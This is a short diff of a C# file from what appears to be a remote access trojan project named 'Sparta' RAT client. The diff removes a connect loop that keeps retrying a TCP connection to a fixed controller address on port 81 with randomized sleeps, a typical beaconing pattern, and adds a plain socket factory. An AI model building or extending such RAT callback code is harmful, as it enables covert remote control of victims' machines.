@@ -1,32 +1,17 @@
 ﻿using System;
+using System.Collections.Generic;
+using System.Linq;
 using System.Net.Sockets;
-using System.Net;
-using System.Threading;
-using RATclientSparta.Server;
-using RATclientSparta.Socket;
+using System.Text;
+using System.Threading.Tasks;
 
-namespace SpartaRATclient
+namespace RATclientSparta.Socket
 {
     public class SocketServer
     {
-        public static System.Net.Sockets.Socket Connect()
+        public static System.Net.Sockets.Socket Set(AddressFamily data, SocketType value, ProtocolType Protocol)
         {
-            System.Net.Sockets.Socket ServerSocketObject = RATclientSparta.Socket.Socket.Set(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
-            IPEndPoint IPEndpoint = RATclientSparta.Socket.EndPoint.Set("192.168.1.18", 81);
-
-            while (true)
-            {
-                try
-                {
-                    ServerSocketObject.Connect(IPEndpoint);
-                    return ServerSocketObject;
-                }
-                catch
-                {
-                    Random _ = new Random();
-                    Thread.Sleep(_.Next(30000, 60000));
-                }
-            }
+            return new System.Net.Sockets.Socket(data, value, Protocol);
         }
     }
 }
